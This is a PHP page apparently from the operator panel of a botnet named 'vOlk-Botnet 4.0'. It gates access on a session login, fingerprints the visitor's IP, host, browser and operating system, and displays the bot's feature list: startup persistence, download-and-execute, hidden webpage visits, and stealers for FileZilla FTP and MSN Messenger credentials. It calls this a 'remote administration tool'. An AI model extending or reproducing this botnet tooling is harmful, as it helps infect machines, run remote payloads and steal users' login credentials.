<?php
@session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }
?>

<?
$ref = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 $ip = getenv("REMOTE_ADDR");
 $date = date("j-n-Y");
 $time = date("g:i:s a");
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $host = gethostbyaddr($ip);
 
 $user_agent = getenv("HTTP_USER_AGENT");
if (strstr($user_agent, "Nav")) $browser = "Netscape";
elseif (strstr($user_agent, "Lynx")) $browser = "Lynx";
elseif (strstr($user_agent, "MSIE 6")) $browser = "Microsoft Internet Explorer 6";
elseif (strstr($user_agent, "MSIE 7")) $browser = "Internet Explorer 7";
elseif (strstr($user_agent, "MSIE 8.0")) $browser = "Internet Explorer 8";
elseif (strstr($user_agent, "Chrome/6.0")) $browser = "Google Chrome";
elseif (strstr($user_agent, "Chrome/7.0")) $browser = "Google Chrome";
elseif (strstr($user_agent, "Firefox/1")) $browser = "Firefox 1";
elseif (strstr($user_agent, "Firefox/2")) $browser = "Firefox 2";
elseif (strstr($user_agent, "Firefox/3")) $browser = "Firefox 3";
elseif (strstr($user_agent, "Opera/7"))   $browser = "Opera 7";
elseif (strstr($user_agent, "Opera/9"))   $browser = "Opera 9";
else $browser = "$user_agent";
if (strstr($user_agent, "Windows 95")) $os = "Windows 95";
elseif (strstr($user_agent, "Win 9x 4.9")) $os = "Windows ME";
elseif (strstr($user_agent, "Windows 98")) $os = "Windows 98";
elseif (strstr($user_agent, "Windows NT 5.0")) $os = "Windows 2000";
elseif (strstr($user_agent, "SV1")) $os = "Windows XP SP2";
elseif (strstr($user_agent, "Windows NT 5.1")) $os = "Windows XP SP2";
elseif (strstr($user_agent, "Windows NT 5.2")) $os = "Windows 2003";
elseif (strstr($user_agent, "Windows NT 6.0")) $os = "Windows Vista";
elseif (strstr($user_agent, "Windows NT 6.1")) $os = "Windows Seven";

else $os = "$user_agent";

?><table width="837" style="height:163px" border="0" cellspacing="0" cellpadding="0">
								  <tr>
									<td width="837" style="height:163px" valign="top">
										<div>
										  <h5 align="left">
											<font color="#999999">[vOlk-Botnet] 
											4.0 
											v<br>
											<br>
											Features<br>
											[+] Add Startup<br>
											[+] Download & Execute.<br>
											[+] Visit Webpage [Visible].<br>
											[+] Visit Webpage [Invisible].<br>
											[+] Mutex <br>
											[+] Stealer FTP(Filezilla)<br>
											[+] Msn Stealer(Messenger Save User)<br>
											[+] Statistics Bot's<br>
											<br>
											[Volk-Botnet] is a remote administration tool, its main function is to manage the HOSTS file of the Win32 operating systems
The code created by [byvOlk] PHP and Visual Basic 6.0</font></h5>
									  </div>
									</td>
								  </tr>
								</table>
							